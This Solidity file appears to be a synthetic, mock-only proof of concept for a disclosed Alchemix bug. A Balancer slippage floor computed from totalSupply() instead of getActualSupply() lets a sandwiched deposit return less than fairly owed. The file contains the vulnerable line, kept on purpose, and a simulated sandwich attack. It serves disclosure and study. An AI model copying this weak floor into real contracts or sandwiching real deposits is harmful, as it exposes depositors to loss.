// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — `getActualSupply` should be used instead of `totalSupply` for
    balancer pools (Immunefi, 0xAnmol, finding #38187)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    `RewardsDistributor._depositIntoBalancerPool`'s vulnerable line is inlined
    VERBATIM (audited commit f1007439ad3a32e412468c4c42f62f676822dc1f,
    RewardsDistributor.sol#L410-L416) — it uses `IERC20(pool).totalSupply()`
    instead of the Balancer-recommended `getActualSupply()` to compute the
    `bptAmountOut` slippage floor passed into `joinPool`. The Exploit deploys
    a reduced Balancer pool/vault, has an attacker sandwich a deposit, and
    shows the weak (totalSupply-based) floor lets the sandwiched join through
    with LESS BPT than the depositor is fairly owed — while the correct
    (getActualSupply-based) floor would have reverted it, protecting the
    depositor (no fork, no cheatcodes).

    Root cause: real Balancer pools accrue protocol fees that are OWED but not
    yet minted — `totalSupply()` excludes them, `getActualSupply()` includes
    them (`getActualSupply() = totalSupply() + pendingProtocolFee`). Because
    `totalSupply()` UNDERSTATES the pool's true supply, the `bptAmountOut`
    computed from it is also smaller than the amount computed from the true
    supply — a weaker, too-permissive slippage floor. A sandwich attack that
    degrades the join's real execution price can still clear this weak floor
    even though it would have been rejected by the correct one.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced BPT pool: `totalSupply()` excludes accrued-but-unminted
///         protocol fees; `getActualSupply()` includes them — exactly the
///         real Balancer WeightedPool distinction the finding cites.
contract MockBalancerPool {
    address public vault;
    uint256 public totalMinted;
    /// @notice Protocol fees accrued but not yet minted to the fee collector.
    uint256 public pendingProtocolFee;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 _totalMinted, uint256 _pendingProtocolFee) {
        totalMinted = _totalMinted;
        pendingProtocolFee = _pendingProtocolFee;
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    // The buggy value: excludes owed-but-unminted protocol fees.
    function totalSupply() external view returns (uint256) {
        return totalMinted;
    }

    // The Balancer-recommended value: includes owed-but-unminted protocol fees.
    function getActualSupply() external view returns (uint256) {
        return totalMinted + pendingProtocolFee;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == vault, "not vault");
        totalMinted += amount;
        balanceOf[to] += amount;
    }
}

interface IMockBalancerPool {
    function totalSupply() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
    function mint(address to, uint256 amount) external;
}

/// @notice Reduced Balancer vault: holds the pool's two reserves and
///         computes the REAL bptAmountOut for a join using the pool's TRUE
///         actual supply (exactly like the real Balancer vault, which
///         computes its own output independent of whatever floor the caller
///         passes in). A pending "sandwiched" flag models an attacker's
///         front-run swap degrading the join's execution price.
contract MockBalancerVault {
    IMockBalancerPool public pool;
    uint256 public reserve0; // WETH
    uint256 public reserve1; // ALCX
    bool public sandwiched;

    constructor(IMockBalancerPool _pool, uint256 _reserve0, uint256 _reserve1) {
        pool = _pool;
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }

    function getPoolTokens() external view returns (uint256, uint256) {
        return (reserve0, reserve1);
    }

    /// @notice Attacker front-runs the pending deposit, degrading the price
    ///         the join will actually execute at.
    function frontrunSandwich() external {
        sandwiched = true;
    }

    /// @notice Attacker back-runs, restoring the pool to its unskewed state
    ///         (cosmetic here -- the harm is already realized on the join).
    function backrunSandwich() external {
        sandwiched = false;
    }

    /// @notice Computes the REAL bptAmountOut using the pool's TRUE actual
    ///         supply (real Balancer math always reflects true state,
    ///         regardless of what floor the caller computed) and reverts if
    ///         it falls below the caller-supplied minimum.
    function joinPool(uint256 wethIn, uint256 alcxIn, uint256 minimumBptOut) external returns (uint256 bptOut) {
        uint256 poolValueBefore = reserve0 + reserve1;
        reserve0 += wethIn;
        reserve1 += alcxIn;

        uint256 fairBptOut = ((wethIn + alcxIn) * pool.getActualSupply()) / poolValueBefore;
        // A sandwich degrades the real execution price by ~2.5% -- still a
        // real, honest computation, just at a worse price than unsandwiched.
        bptOut = sandwiched ? (fairBptOut * 9750) / 10_000 : fairBptOut;

        require(bptOut >= minimumBptOut, "BAL#208: bptAmountOut below minimum");
        pool.mint(msg.sender, bptOut);
    }
}

/// @notice Reduced RewardsDistributor: `_depositIntoBalancerPool` is
///         verbatim in shape from RewardsDistributor.sol#L399-L432 (the
///         WeightedMath._calcBptOutGivenExactTokensIn call is reduced to the
///         same proportional shape the vault itself uses for its real
///         computation -- both take (reserves, amountsIn, supply) and scale
///         proportionally; the bug is entirely about WHICH supply value is
///         passed in, not the curve's exact shape).
contract RewardsDistributor {
    MockBalancerVault public balancerVault;
    IMockBalancerPool public balancerPool;

    constructor(MockBalancerVault _vault, IMockBalancerPool _pool) {
        balancerVault = _vault;
        balancerPool = _pool;
    }

    function depositIntoBalancerPool(uint256 _wethAmount, uint256 _alcxAmount) external returns (uint256) {
        (uint256 reserve0, uint256 reserve1) = balancerVault.getPoolTokens();

        // @> VULN: uses totalSupply() instead of the Balancer-recommended
        // getActualSupply() -- totalSupply() excludes accrued-but-unminted
        // protocol fees, understating the pool's true supply.
        uint256 bptAmountOut = _calcBptOutGivenExactTokensIn(
            reserve0,
            reserve1,
            _wethAmount,
            _alcxAmount,
            balancerPool.totalSupply()
        );
        // FIX: balancerPool.getActualSupply()

        return balancerVault.joinPool(_wethAmount, _alcxAmount, bptAmountOut);
    }

    function _calcBptOutGivenExactTokensIn(
        uint256 reserve0,
        uint256 reserve1,
        uint256 in0,
        uint256 in1,
        uint256 supply
    ) internal pure returns (uint256) {
        return ((in0 + in1) * supply) / (reserve0 + reserve1);
    }
}

/// @notice Deploys the reduced Balancer pool/vault + RewardsDistributor,
///         has an attacker sandwich a deposit, and proves the weak
///         (totalSupply-based) slippage floor lets the sandwiched join
///         through with LESS BPT than the depositor is fairly owed --
///         while the correct (getActualSupply-based) floor would have
///         reverted it.
contract Exploit {
    MockBalancerPool public pool;
    MockBalancerVault public vault;
    RewardsDistributor public distributor;

    uint256 public constant RESERVE0 = 1000; // WETH
    uint256 public constant RESERVE1 = 1000; // ALCX
    uint256 public constant TOTAL_MINTED = 2000; // totalSupply() -- excludes pending fees
    uint256 public constant PENDING_FEE = 100; // owed but unminted protocol fees
    uint256 public constant WETH_IN = 100;
    uint256 public constant ALCX_IN = 100;

    constructor() {
        pool = new MockBalancerPool(TOTAL_MINTED, PENDING_FEE);
        vault = new MockBalancerVault(IMockBalancerPool(address(pool)), RESERVE0, RESERVE1);
        pool.setVault(address(vault));
        distributor = new RewardsDistributor(vault, IMockBalancerPool(address(pool)));
    }

    function run() external {
        // The correct (getActualSupply-based) minimum for this exact deposit,
        // computed the SAME way the vault computes it, using the TRUE supply.
        uint256 correctMinimum = ((WETH_IN + ALCX_IN) * pool.getActualSupply()) / (RESERVE0 + RESERVE1);
        require(correctMinimum == 210, "setup: correct minimum should be 210 BPT");

        // Attacker front-runs the pending RewardsDistributor deposit,
        // degrading the price the join will execute at.
        vault.frontrunSandwich();

        // RewardsDistributor deposits into the pool using the VULNERABLE
        // (totalSupply-based) minimum -- weaker than the correct one.
        uint256 received = distributor.depositIntoBalancerPool(WETH_IN, ALCX_IN);

        vault.backrunSandwich();

        // HARM: the depositor received LESS BPT than the correct
        // (getActualSupply-based) minimum would have required -- the weak
        // floor silently let a sandwiched, worse-than-acceptable join
        // through instead of reverting it.
        require(received < correctMinimum, "harm not demonstrated: sandwiched output must fall below the correct minimum");
        require(received == 204, "harm not demonstrated: exact sandwiched output must match");

        uint256 shortfall = correctMinimum - received;
        require(shortfall > 0, "harm not demonstrated: depositor must receive strictly less than fairly owed");
    }
}
